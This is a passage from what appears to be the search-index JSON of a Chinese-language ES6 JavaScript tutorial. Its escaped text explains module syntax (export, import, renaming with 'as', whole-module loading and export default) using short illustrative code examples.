<p>\u4e0a\u9762\u4ee3\u7801\u5728<code>export</code>\u547d\u4ee4\u540e\u9762\uff0c\u4f7f\u7528\u5927\u62ec\u53f7\u6307\u5b9a\u6240\u8981\u8f93\u51fa\u7684\u4e00\u7ec4\u53d8\u91cf\u3002\u5b83\u4e0e\u524d\u4e00\u79cd\u5199\u6cd5\uff08\u76f4\u63a5\u653e\u7f6e\u5728<code>var</code>\u8bed\u53e5\u524d\uff09\u662f\u7b49\u4ef7\u7684\uff0c\u4f46\u662f\u5e94\u8be5\u4f18\u5148\u8003\u8651\u4f7f\u7528\u8fd9\u79cd\u5199\u6cd5\u3002\u56e0\u4e3a\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728\u811a\u672c\u5c3e\u90e8\uff0c\u4e00\u773c\u770b\u6e05\u695a\u8f93\u51fa\u4e86\u54ea\u4e9b\u53d8\u91cf\u3002</p> <p><code>export</code>\u547d\u4ee4\u9664\u4e86\u8f93\u51fa\u53d8\u91cf\uff0c\u8fd8\u53ef\u4ee5\u8f93\u51fa\u51fd\u6570\u6216\u7c7b\uff08class\uff09\u3002</p> <pre><code>export function multiply(x, y) {\n  return x * y;\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5bf9\u5916\u8f93\u51fa\u4e00\u4e2a\u51fd\u6570<code>multiply</code>\u3002</p> <p>\u901a\u5e38\u60c5\u51b5\u4e0b==\uff0c<code>export</code>\u8f93\u51fa\u7684\u53d8\u91cf\u5c31\u662f\u672c\u6765\u7684\u540d\u5b57\uff0c\u4f46\u662f\u53ef\u4ee5\u4f7f\u7528<code>as</code>\u5173\u952e\u5b57\u91cd\u547d\u540d==\u3002</p> <pre><code>function v1() { ... }\nfunction v2() { ... }\n\nexport {\n  v1 as streamV1,\n  v2 as streamV2,\n  v2 as streamLatestVersion\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4f7f\u7528<code>as</code>\u5173\u952e\u5b57\uff0c\u91cd\u547d\u540d\u4e86\u51fd\u6570<code>v1</code>\u548c<code>v2</code>\u7684\u5bf9\u5916\u63a5\u53e3\u3002\u91cd\u547d\u540d\u540e\uff0c<code>v2</code>\u53ef\u4ee5\u7528\u4e0d\u540c\u7684\u540d\u5b57\u8f93\u51fa\u4e24\u6b21\u3002</p> <p>\u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0c<code>export</code>\u547d\u4ee4\u89c4\u5b9a\u7684\u662f\u5bf9\u5916\u7684\u63a5\u53e3\uff0c\u5fc5\u987b\u4e0e\u6a21\u5757\u5185\u90e8\u7684\u53d8\u91cf\u5efa\u7acb\u4e00\u4e00\u5bf9\u5e94\u5173\u7cfb\u3002</p> <pre><code>// \u62a5\u9519\nexport 1;\n\n// \u62a5\u9519\nvar m = 1;\nexport m;\n</code></pre> <p>\u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\u90fd\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u6ca1\u6709\u63d0\u4f9b\u5bf9\u5916\u7684\u63a5\u53e3\u3002\u7b2c\u4e00\u79cd\u5199\u6cd5\u76f4\u63a5\u8f93\u51fa 1\uff0c\u7b2c\u4e8c\u79cd\u5199\u6cd5\u901a\u8fc7\u53d8\u91cf<code>m</code>\uff0c\u8fd8\u662f\u76f4\u63a5\u8f93\u51fa 1\u3002<code>1</code>\u53ea\u662f\u4e00\u4e2a\u503c\uff0c\u4e0d\u662f\u63a5\u53e3\u3002\u6b63\u786e\u7684\u5199\u6cd5\u662f\u4e0b\u9762\u8fd9\u6837\u3002</p> <pre><code>// \u5199\u6cd5\u4e00\nexport var m = 1;\n\n// \u5199\u6cd5\u4e8c\nvar m = 1;\nexport {m};\n\n// \u5199\u6cd5\u4e09\nvar n = 1;\nexport {n as m};\n</code></pre> <p>\u4e0a\u9762\u4e09\u79cd\u5199\u6cd5\u90fd\u662f\u6b63\u786e\u7684\uff0c\u89c4\u5b9a\u4e86\u5bf9\u5916\u7684\u63a5\u53e3<code>m</code>\u3002\u5176\u4ed6\u811a\u672c\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u63a5\u53e3\uff0c\u53d6\u5230\u503c<code>1</code>\u3002\u5b83\u4eec\u7684\u5b9e\u8d28\u662f\uff0c\u5728\u63a5\u53e3\u540d\u4e0e\u6a21\u5757\u5185\u90e8\u53d8\u91cf\u4e4b\u95f4\uff0c\u5efa\u7acb\u4e86\u4e00\u4e00\u5bf9\u5e94\u7684\u5173\u7cfb\u3002</p> <p>\u540c\u6837\u7684\uff0c<code>function</code>\u548c<code>class</code>\u7684\u8f93\u51fa\uff0c\u4e5f\u5fc5\u987b\u9075\u5b88\u8fd9\u6837\u7684\u5199\u6cd5\u3002</p> <pre><code>// \u62a5\u9519\nfunction f() {}\nexport f;\n\n// \u6b63\u786e\nexport function f() {};\n\n// \u6b63\u786e\nfunction f() {}\nexport {f};\n</code></pre> <p>\u53e6\u5916\uff0c<code>export</code>\u8bed\u53e5\u8f93\u51fa\u7684\u63a5\u53e3\uff0c\u4e0e\u5176\u5bf9\u5e94\u7684\u503c\u662f\u52a8\u6001\u7ed1\u5b9a\u5173\u7cfb\uff0c\u5373\u901a\u8fc7\u8be5\u63a5\u53e3\uff0c\u53ef\u4ee5\u53d6\u5230\u6a21\u5757\u5185\u90e8\u5b9e\u65f6\u7684\u503c\u3002</p> <pre><code>export var foo = 'bar';\nsetTimeout(() =&gt; foo = 'baz', 500);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8f93\u51fa\u53d8\u91cf<code>foo</code>\uff0c\u503c\u4e3a<code>bar</code>\uff0c500 \u6beb\u79d2\u4e4b\u540e\u53d8\u6210<code>baz</code>\u3002</p> <p>\u8fd9\u4e00\u70b9\u4e0e CommonJS \u89c4\u8303\u5b8c\u5168\u4e0d\u540c\u3002CommonJS \u6a21\u5757\u8f93\u51fa\u7684\u662f\u503c\u7684\u7f13\u5b58\uff0c\u4e0d\u5b58\u5728\u52a8\u6001\u66f4\u65b0\uff0c\u8be6\u89c1\u4e0b\u6587\u300aModule \u7684\u52a0\u8f7d\u5b9e\u73b0\u300b\u4e00\u8282\u3002</p> <p>\u6700\u540e\uff0c<code>export</code>\u547d\u4ee4\u53ef\u4ee5\u51fa\u73b0\u5728\u6a21\u5757\u7684\u4efb\u4f55\u4f4d\u7f6e\uff0c\u53ea\u8981\u5904\u4e8e\u6a21\u5757\u9876\u5c42\u5c31\u53ef\u4ee5\u3002\u5982\u679c\u5904\u4e8e\u5757\u7ea7\u4f5c\u7528\u57df\u5185\uff0c\u5c31\u4f1a\u62a5\u9519\uff0c\u4e0b\u4e00\u8282\u7684<code>import</code>\u547d\u4ee4\u4e5f\u662f\u5982\u6b64\u3002\u8fd9\u662f\u56e0\u4e3a\u5904\u4e8e\u6761\u4ef6\u4ee3\u7801\u5757\u4e4b\u4e2d\uff0c\u5c31\u6ca1\u6cd5\u505a\u9759\u6001\u4f18\u5316\u4e86\uff0c\u8fdd\u80cc\u4e86 ES6 \u6a21\u5757\u7684\u8bbe\u8ba1\u521d\u8877\u3002</p> <pre><code>function foo() {\n  export default 'bar' // SyntaxError\n}\nfoo()\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>export</code>\u8bed\u53e5\u653e\u5728\u51fd\u6570\u4e4b\u4e2d\uff0c\u7ed3\u679c\u62a5\u9519\u3002</p>"},{"location":"ebook-JSES6-RYF/23-Module%20%E7%9A%84%E8%AF%AD%E6%B3%95/#import","title":"import \u547d\u4ee4","text":"<p>\u4f7f\u7528<code>export</code>\u547d\u4ee4\u5b9a\u4e49\u4e86\u6a21\u5757\u7684\u5bf9\u5916\u63a5\u53e3\u4ee5\u540e\uff0c\u5176\u4ed6 JS \u6587\u4ef6\u5c31\u53ef\u4ee5\u901a\u8fc7<code>import</code>\u547d\u4ee4\u52a0\u8f7d\u8fd9\u4e2a\u6a21\u5757\u3002</p> <pre><code>// main.js\nimport { firstName, lastName, year } from './profile.js';\n\nfunction setName(element) {\n  element.textContent = firstName + ' ' + lastName;\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684<code>import</code>\u547d\u4ee4\uff0c\u7528\u4e8e\u52a0\u8f7d<code>profile.js</code>\u6587\u4ef6\uff0c\u5e76\u4ece\u4e2d\u8f93\u5165\u53d8\u91cf\u3002<code>import</code>\u547d\u4ee4\u63a5\u53d7\u4e00\u5bf9\u5927\u62ec\u53f7\uff0c\u91cc\u9762\u6307\u5b9a\u8981\u4ece\u5176\u4ed6\u6a21\u5757\u5bfc\u5165\u7684\u53d8\u91cf\u540d\u3002\u5927\u62ec\u53f7\u91cc\u9762\u7684\u53d8\u91cf\u540d\uff0c\u5fc5\u987b\u4e0e\u88ab\u5bfc\u5165\u6a21\u5757\uff08<code>profile.js</code>\uff09\u5bf9\u5916\u63a5\u53e3\u7684\u540d\u79f0\u76f8\u540c\u3002</p> <p>\u5982\u679c\u60f3\u4e3a\u8f93\u5165\u7684\u53d8\u91cf\u91cd\u65b0\u53d6\u4e00\u4e2a\u540d\u5b57\uff0c<code>import</code>\u547d\u4ee4\u8981\u4f7f\u7528<code>as</code>\u5173\u952e\u5b57\uff0c\u5c06\u8f93\u5165\u7684\u53d8\u91cf\u91cd\u547d\u540d\u3002</p> <pre><code>import { lastName as surname } from './profile.js';\n</code></pre> <p><code>import</code>\u547d\u4ee4\u8f93\u5165\u7684\u53d8\u91cf\u90fd\u662f\u53ea\u8bfb\u7684\uff0c\u56e0\u4e3a\u5b83\u7684\u672c\u8d28\u662f\u8f93\u5165\u63a5\u53e3\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u5141\u8bb8\u5728\u52a0\u8f7d\u6a21\u5757\u7684\u811a\u672c\u91cc\u9762\uff0c\u6539\u5199\u63a5\u53e3\u3002</p> <pre><code>import {a} from './xxx.js'\n\na = {}; // Syntax Error : 'a' is read-only;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u811a\u672c\u52a0\u8f7d\u4e86\u53d8\u91cf<code>a</code>\uff0c\u5bf9\u5176\u91cd\u65b0\u8d4b\u503c\u5c31\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a<code>a</code>\u662f\u4e00\u4e2a\u53ea\u8bfb\u7684\u63a5\u53e3\u3002\u4f46\u662f\uff0c\u5982\u679c<code>a</code>\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u6539\u5199<code>a</code>\u7684\u5c5e\u6027\u662f\u5141\u8bb8\u7684\u3002</p> <pre><code>import {a} from './xxx.js'\n\na.foo = 'hello'; // \u5408\u6cd5\u64cd\u4f5c\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>a</code>\u7684\u5c5e\u6027\u53ef\u4ee5\u6210\u529f\u6539\u5199\uff0c\u5e76\u4e14\u5176\u4ed6\u6a21\u5757\u4e5f\u53ef\u4ee5\u8bfb\u5230\u6539\u5199\u540e\u7684\u503c\u3002\u4e0d\u8fc7\uff0c\u8fd9\u79cd\u5199\u6cd5\u5f88\u96be\u67e5\u9519\uff0c\u5efa\u8bae\u51e1\u662f\u8f93\u5165\u7684\u53d8\u91cf\uff0c\u90fd\u5f53\u4f5c\u5b8c\u5168\u53ea\u8bfb\uff0c\u8f7b\u6613\u4e0d\u8981\u6539\u53d8\u5b83\u7684\u5c5e\u6027\u3002</p> <p><code>import</code>\u540e\u9762\u7684<code>from</code>\u6307\u5b9a\u6a21\u5757\u6587\u4ef6\u7684\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u662f\u76f8\u5bf9\u8def\u5f84\uff0c\u4e5f\u53ef\u4ee5\u662f\u7edd\u5bf9\u8def\u5f84\uff0c<code>.js</code>\u540e\u7f00\u53ef\u4ee5\u7701\u7565\u3002\u5982\u679c\u53ea\u662f\u6a21\u5757\u540d\uff0c\u4e0d\u5e26\u6709\u8def\u5f84\uff0c\u90a3\u4e48\u5fc5\u987b\u6709\u914d\u7f6e\u6587\u4ef6\uff0c\u544a\u8bc9 JavaScript \u5f15\u64ce\u8be5\u6a21\u5757\u7684\u4f4d\u7f6e\u3002</p> <pre><code>import {myMethod} from 'util';\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>util</code>\u662f\u6a21\u5757\u6587\u4ef6\u540d\uff0c\u7531\u4e8e\u4e0d\u5e26\u6709\u8def\u5f84\uff0c\u5fc5\u987b\u901a\u8fc7\u914d\u7f6e\uff0c\u544a\u8bc9\u5f15\u64ce\u600e\u4e48\u53d6\u5230\u8fd9\u4e2a\u6a21\u5757\u3002</p> <p>\u6ce8\u610f\uff0c<code>import</code>\u547d\u4ee4\u5177\u6709\u63d0\u5347\u6548\u679c\uff0c\u4f1a\u63d0\u5347\u5230\u6574\u4e2a\u6a21\u5757\u7684\u5934\u90e8\uff0c\u9996\u5148\u6267\u884c\u3002</p> <pre><code>foo();\n\nimport { foo } from 'my_module';\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u4e0d\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a<code>import</code>\u7684\u6267\u884c\u65e9\u4e8e<code>foo</code>\u7684\u8c03\u7528\u3002\u8fd9\u79cd\u884c\u4e3a\u7684\u672c\u8d28\u662f\uff0c<code>import</code>\u547d\u4ee4\u662f\u7f16\u8bd1\u9636\u6bb5\u6267\u884c\u7684\uff0c\u5728\u4ee3\u7801\u8fd0\u884c\u4e4b\u524d\u3002</p> <p>\u7531\u4e8e<code>import</code>\u662f\u9759\u6001\u6267\u884c\uff0c\u6240\u4ee5\u4e0d\u80fd\u4f7f\u7528\u8868\u8fbe\u5f0f\u548c\u53d8\u91cf\uff0c\u8fd9\u4e9b\u53ea\u6709\u5728\u8fd0\u884c\u65f6\u624d\u80fd\u5f97\u5230\u7ed3\u679c\u7684\u8bed\u6cd5\u7ed3\u6784\u3002</p> <pre><code>// \u62a5\u9519\nimport { 'f' + 'oo' } from 'my_module';\n\n// \u62a5\u9519\nlet module = 'my_module';\nimport { foo } from module;\n\n// \u62a5\u9519\nif (x === 1) {\n  import { foo } from 'module1';\n} else {\n  import { foo } from 'module2';\n}\n</code></pre> <p>\u4e0a\u9762\u4e09\u79cd\u5199\u6cd5\u90fd\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u5b83\u4eec\u7528\u5230\u4e86\u8868\u8fbe\u5f0f\u3001\u53d8\u91cf\u548c<code>if</code>\u7ed3\u6784\u3002\u5728\u9759\u6001\u5206\u6790\u9636\u6bb5\uff0c\u8fd9\u4e9b\u8bed\u6cd5\u90fd\u662f\u6ca1\u6cd5\u5f97\u5230\u503c\u7684\u3002</p> <p>\u6700\u540e\uff0c<code>import</code>\u8bed\u53e5\u4f1a\u6267\u884c\u6240\u52a0\u8f7d\u7684\u6a21\u5757\uff0c\u56e0\u6b64\u53ef\u4ee5\u6709\u4e0b\u9762\u7684\u5199\u6cd5\u3002</p> <pre><code>import 'lodash';\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4ec5\u4ec5\u6267\u884c<code>lodash</code>\u6a21\u5757\uff0c\u4f46\u662f\u4e0d\u8f93\u5165\u4efb\u4f55\u503c\u3002</p> <p>\u5982\u679c\u591a\u6b21\u91cd\u590d\u6267\u884c\u540c\u4e00\u53e5<code>import</code>\u8bed\u53e5\uff0c\u90a3\u4e48\u53ea\u4f1a\u6267\u884c\u4e00\u6b21\uff0c\u800c\u4e0d\u4f1a\u6267\u884c\u591a\u6b21\u3002</p> <pre><code>import 'lodash';\nimport 'lodash';\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u52a0\u8f7d\u4e86\u4e24\u6b21<code>lodash</code>\uff0c\u4f46\u662f\u53ea\u4f1a\u6267\u884c\u4e00\u6b21\u3002</p> <pre><code>import { foo } from 'my_module';\nimport { bar } from 'my_module';\n\n// \u7b49\u540c\u4e8e\nimport { foo, bar } from 'my_module';\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u867d\u7136<code>foo</code>\u548c<code>bar</code>\u5728\u4e24\u4e2a\u8bed\u53e5\u4e2d\u52a0\u8f7d\uff0c\u4f46\u662f\u5b83\u4eec\u5bf9\u5e94\u7684\u662f\u540c\u4e00\u4e2a<code>my_module</code>\u5b9e\u4f8b\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c<code>import</code>\u8bed\u53e5\u662f Singleton \u6a21\u5f0f\u3002</p> <p>\u76ee\u524d\u9636\u6bb5\uff0c\u901a\u8fc7 Babel \u8f6c\u7801\uff0cCommonJS \u6a21\u5757\u7684<code>require</code>\u547d\u4ee4\u548c ES6 \u6a21\u5757\u7684<code>import</code>\u547d\u4ee4\uff0c\u53ef\u4ee5\u5199\u5728\u540c\u4e00\u4e2a\u6a21\u5757\u91cc\u9762\uff0c\u4f46\u662f\u6700\u597d\u4e0d\u8981\u8fd9\u6837\u505a\u3002\u56e0\u4e3a<code>import</code>\u5728\u9759\u6001\u89e3\u6790\u9636\u6bb5\u6267\u884c\uff0c\u6240\u4ee5\u5b83\u662f\u4e00\u4e2a\u6a21\u5757\u4e4b\u4e2d\u6700\u65e9\u6267\u884c\u7684\u3002\u4e0b\u9762\u7684\u4ee3\u7801\u53ef\u80fd\u4e0d\u4f1a\u5f97\u5230\u9884\u671f\u7ed3\u679c\u3002</p> <pre><code>require('core-js/modules/es6.symbol');\nrequire('core-js/modules/es6.promise');\nimport React from 'React';\n</code></pre>"},{"location":"ebook-JSES6-RYF/23-Module%20%E7%9A%84%E8%AF%AD%E6%B3%95/#_3","title":"\u6a21\u5757\u7684\u6574\u4f53\u52a0\u8f7d","text":"<p>\u9664\u4e86\u6307\u5b9a\u52a0\u8f7d\u67d0\u4e2a\u8f93\u51fa\u503c\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u6574\u4f53\u52a0\u8f7d\uff0c\u5373\u7528\u661f\u53f7\uff08<code>*</code>\uff09\u6307\u5b9a\u4e00\u4e2a\u5bf9\u8c61\uff0c\u6240\u6709\u8f93\u51fa\u503c\u90fd\u52a0\u8f7d\u5728\u8fd9\u4e2a\u5bf9\u8c61\u4e0a\u9762\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a<code>circle.js</code>\u6587\u4ef6\uff0c\u5b83\u8f93\u51fa\u4e24\u4e2a\u65b9\u6cd5<code>area</code>\u548c<code>circumference</code>\u3002</p> <pre><code>// circle.js\n\nexport function area(radius) {\n  return Math.PI * radius * radius;\n}\n\nexport function circumference(radius) {\n  return 2 * Math.PI * radius;\n}\n</code></pre> <p>\u73b0\u5728\uff0c\u52a0\u8f7d\u8fd9\u4e2a\u6a21\u5757\u3002</p> <pre><code>import { area, circumference } from './circle';\n\nconsole.log('\u5706\u9762\u79ef\uff1a' + area(4));\nconsole.log('\u5706\u5468\u957f\uff1a' + circumference(14));\n</code></pre> <p>\u4e0a\u9762\u5199\u6cd5\u662f\u9010\u4e00\u6307\u5b9a\u8981\u52a0\u8f7d\u7684\u65b9\u6cd5\uff0c\u6574\u4f53\u52a0\u8f7d\u7684\u5199\u6cd5\u5982\u4e0b\u3002</p> <pre><code>import * as circle from './circle';\n\nconsole.log('\u5706\u9762\u79ef\uff1a' + circle.area(4));\nconsole.log('\u5706\u5468\u957f\uff1a' + circle.circumference(14));\n</code></pre> <p>\u6ce8\u610f\uff0c\u6a21\u5757\u6574\u4f53\u52a0\u8f7d\u6240\u5728\u7684\u90a3\u4e2a\u5bf9\u8c61\uff08\u4e0a\u4f8b\u662f<code>circle</code>\uff09\uff0c\u5e94\u8be5\u662f\u53ef\u4ee5\u9759\u6001\u5206\u6790\u7684\uff0c\u6240\u4ee5\u4e0d\u5141\u8bb8\u8fd0\u884c\u65f6\u6539\u53d8\u3002\u4e0b\u9762\u7684\u5199\u6cd5\u90fd\u662f\u4e0d\u5141\u8bb8\u7684\u3002</p> <pre><code>import * as circle from './circle';\n\n// \u4e0b\u9762\u4e24\u884c\u90fd\u662f\u4e0d\u5141\u8bb8\u7684\ncircle.foo = 'hello';\ncircle.area = function () {};\n</code></pre>"},{"location":"ebook-JSES6-RYF/23-Module%20%E7%9A%84%E8%AF%AD%E6%B3%95/#export-default","title":"export default \u547d\u4ee4","text":"<p>\u4ece\u524d\u9762\u7684\u4f8b\u5b50\u53ef\u4ee5\u770b\u51fa\uff0c\u4f7f\u7528<code>import</code>\u547d\u4ee4\u7684\u65f6\u5019\uff0c\u7528\u6237\u9700\u8981\u77e5\u9053\u6240\u8981\u52a0\u8f7d\u7684\u53d8\u91cf\u540d\u6216\u51fd\u6570\u540d\uff0c\u5426\u5219\u65e0\u6cd5\u52a0\u8f7d\u3002\u4f46\u662f\uff0c\u7528\u6237\u80af\u5b9a\u5e0c\u671b\u5feb\u901f\u4e0a\u624b\uff0c\u672a\u5fc5\u613f\u610f\u9605\u8bfb\u6587\u6863\uff0c\u53bb\u4e86\u89e3\u6a21\u5757\u6709\u54ea\u4e9b\u5c5e\u6027\u548c\u65b9\u6cd5\u3002</p> <p>\u4e3a\u4e86\u7ed9\u7528\u6237\u63d0\u4f9b\u65b9\u4fbf\uff0c\u8ba9\u4ed6\u4eec\u4e0d\u7528\u9605\u8bfb\u6587\u6863\u5c31\u80fd\u52a0\u8f7d\u6a21\u5757\uff0c\u5c31\u8981\u7528\u5230<code>export default</code>\u547d\u4ee4\uff0c\u4e3a\u6a21\u5757\u6307\u5b9a\u9ed8\u8ba4\u8f93\u51fa\u3002</p> <pre><code>// export-default.js\nexport default function () {\n  console.log('foo');\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u662f\u4e00\u4e2a\u6a21\u5757\u6587\u4ef6<code>export-default.js</code>\uff0c\u5b83\u7684\u9ed8\u8ba4\u8f93\u51fa\u662f\u4e00\u4e2a\u51fd\u6570\u3002</p> <p>\u5176\u4ed6\u6a21\u5757\u52a0\u8f7d\u8be5\u6a21\u5757\u65f6\uff0c<code>import</code>\u547d\u4ee4\u53ef\u4ee5\u4e3a\u8be5\u533f\u540d\u51fd\u6570\u6307\u5b9a\u4efb\u610f\u540d\u5b57\u3002</p> <pre><code>// import-default.js\nimport customName from './export-default';\ncustomName(); // 'foo'\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684<code>import</code>\u547d\u4ee4\uff0c\u53ef\u4ee5\u7528\u4efb\u610f\u540d\u79f0\u6307\u5411<code>export-default.js</code>\u8f93\u51fa\u7684\u65b9\u6cd5\uff0c\u8fd9\u65f6\u5c31\u4e0d\u9700\u8981\u77e5\u9053\u539f\u6a21\u5757\u8f93\u51fa\u7684\u51fd\u6570\u540d\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u65f6<code>import</code>\u547d\u4ee4\u540e\u9762\uff0c\u4e0d\u4f7f\u7528\u5927\u62ec\u53f7\u3002</p> <p><code>export default</code>\u547d\u4ee4\u7528\u5728\u975e\u533f\u540d\u51fd\u6570\u524d\uff0c\u4e5f\u662f\u53ef\u4ee5\u7684\u3002</p> <pre><code>// export-default.js\nexport default function foo() {\n  console.log('foo');\n}\n\n// \u6216\u8005\u5199\u6210\n\nfunction foo() {\n  console.log('foo');\n}\n\nexport default foo;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>foo</code>\u51fd\u6570\u7684\u51fd\u6570\u540d<code>foo</code>\uff0c\u5728\u6a21\u5757\u5916\u90e8\u662f\u65e0\u6548\u7684\u3002\u52a0\u8f7d\u7684\u65f6\u5019\uff0c\u89c6\u540c\u533f\u540d\u51fd\u6570\u52a0\u8f7d\u3002</p> <p>\u4e0b\u9762\u6bd4\u8f83\u4e00\u4e0b\u9ed8\u8ba4\u8f93\u51fa\u548c\u6b63\u5e38\u8f93\u51fa\u3002</p> <pre><code>// \u7b2c\u4e00\u7ec4\nexport default function crc32() { // \u8f93\u51fa\n  // ...\n}\n\nimport crc32 from 'crc32'; // \u8f93\u5165\n\n// \u7b2c\u4e8c\u7ec4\nexport function crc32() { // \u8f93\u51fa\n  // ...\n};\n\nimport {crc32} from 'crc32'; // \u8f93\u5165\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u4e24\u7ec4\u5199\u6cd5\uff0c\u7b2c\u4e00\u7ec4\u662f\u4f7f\u7528<code>export default</code>\u65f6\uff0c\u5bf9\u5e94\u7684<code>import</code>\u8bed\u53e5\u4e0d\u9700\u8981\u4f7f\u7528\u5927\u62ec\u53f7\uff1b\u7b2c\u4e8c\u7ec4\u662f\u4e0d\u4f7f\u7528<code>export default</code>\u65f6\uff0c\u5bf9\u5e94\u7684<code>import</code>\u8bed\u53e5\u9700\u8981\u4f7f\u7528\u5927\u62ec\u53f7\u3002</p> <p><code>export default</code>\u547d\u4ee4\u7528\u4e8e\u6307\u5b9a\u6a21\u5757\u7684\u9ed8\u8ba4\u8f93\u51fa\u3002\u663e\u7136\uff0c\u4e00\u4e2a\u6a21\u5757\u53ea\u80fd\u6709\u4e00\u4e2a\u9ed8\u8ba4\u8f93\u51fa\uff0c\u56e0\u6b64<code>export default</code>\u547d\u4ee4\u53ea\u80fd\u4f7f\u7528\u4e00\u6b21\u3002\u6240\u4ee5\uff0cimport\u547d\u4ee4\u540e\u9762\u624d\u4e0d\u7528\u52a0\u5927\u62ec\u53f7\uff0c\u56e0\u4e3a\u53ea\u53ef\u80fd\u552f\u4e00\u5bf9\u5e94<code>export default</code>\u547d\u4ee4\u3002</p> <p>\u672c\u8d28\u4e0a\uff0c<code>export default</code>\u5c31\u662f\u8f93\u51fa\u4e00\u4e2a\u53eb\u505a<code>default</code>\u7684\u53d8\u91cf\u6216\u65b9\u6cd5\uff0c\u7136\u540e\u7cfb\u7edf\u5141\u8bb8\u4f60\u4e3a\u5b83\u53d6\u4efb\u610f\u540d\u5b57\u3002\u6240\u4ee5\uff0c\u4e0b\u9762\u7684\u5199\u6cd5\u662f\u6709\u6548\u7684\u3002</p> <pre><code>// modules.js\nfunction add(x, y) {\n  return x * y;\n}\nexport {add as default};\n// \u7b49\u540c\u4e8e\n// export default add;\n\n// app.js\nimport { default as foo } from 'modules';\n// \u7b49\u540c\u4e8e\n// import foo from 'modules';\n</code></pre> <p>\u6b63\u662f\u56e0\u4e3a<code>export default</code>\u547d\u4ee4\u5176\u5b9e\u53ea\u662f\u8f93\u51fa\u4e00\u4e2a\u53eb\u505a<code>default</code>\u7684\u53d8\u91cf\uff0c\u6240\u4ee5\u5b83\u540e\u9762\u4e0d\u80fd\u8ddf\u53d8\u91cf\u58f0\u660e\u8bed\u53e5\u3002</p> <pre><code>// \u6b63\u786e\nexport var a = 1;\n\n// \u6b63\u786e\nvar a = 1;\nexport default a;\n\n// \u9519\u8bef\nexport default var a = 1;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>export default a</code>\u7684\u542b\u4e49\u662f\u5c06\u53d8\u91cf<code>a</code>\u7684\u503c\u8d4b\u7ed9\u53d8\u91cf<code>default</code>\u3002\u6240\u4ee5\uff0c\u6700\u540e\u4e00\u79cd\u5199\u6cd5\u4f1a\u62a5\u9519\u3002</p> <p>\u540c\u6837\u5730\uff0c\u56e0\u4e3a<code>export default</code>\u547d\u4ee4\u7684\u672c\u8d28\u662f\u5c06\u540e\u9762\u7684\u503c\uff0c\u8d4b\u7ed9<code>default</code>\u53d8\u91cf\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u5c06\u4e00\u4e2a\u503c\u5199\u5728<code>export default</code>\u4e4b\u540e\u3002</p> <pre><code>// \u6b63\u786e\nexport default 42;\n\n// \u62a5\u9519\nexport 42;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u540e\u4e00\u53e5\u62a5\u9519\u662f\u56e0\u4e3a\u6ca1\u6709\u6307\u5b9a\u5bf9\u5916\u7684\u63a5\u53e3\uff0c\u800c\u524d\u4e00\u53e5\u6307\u5b9a\u5bf9\u5916\u63a5\u53e3\u4e3a<code>default</code>\u3002</p> <p>\u6709\u4e86<code>export default</code>\u547d\u4ee4\uff0c\u8f93\u5165\u6a21\u5757\u65f6\u5c31\u975e\u5e38\u76f4\u89c2\u4e86\uff0c\u4ee5\u8f93\u5165 lodash \u6a21\u5757\u4e3a\u4f8b\u3002</p> <pre><code>import _ from 'lodash';\n</code></pre> <p>\u5982\u679c\u60f3\u5728\u4e00\u6761<code>import</code>\u8bed\u53e5\u4e2d\uff0c\u540c\u65f6\u8f93\u5165\u9ed8\u8ba4\u65b9\u6cd5\u548c\u5176\u4ed6\u63a5\u53e3\uff0c\u53ef\u4ee5\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002</p> <pre><code>import _, { each, forEach } from 'lodash';\n</code></pre> <p>\u5bf9\u5e94\u4e0a\u9762\u4ee3\u7801\u7684<code>export</code>\u8bed\u53e5\u5982\u4e0b\u3002</p> <pre><code>export default function (obj) {\n  // \u00b7\u00b7\u00b7\n}\n\nexport function each(obj, iterator, context) {\n  // \u00b7\u00b7\u00b7\n}\n\nexport { each as forEach };\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u6700\u540e\u4e00\u884c\u7684\u610f\u601d\u662f\uff0c\u66b4\u9732\u51fa<code>forEach</code>\u63a5\u53e3\uff0c\u9ed8\u8ba4\u6307\u5411<code>each</code>\u63a5\u53e3\uff0c\u5373<code>forEach</code>\u548c<code>each</code>\u6307\u5411\u540c\u4e00\u4e2a\u65b9\u6cd5\u3002</p> <p><code>export 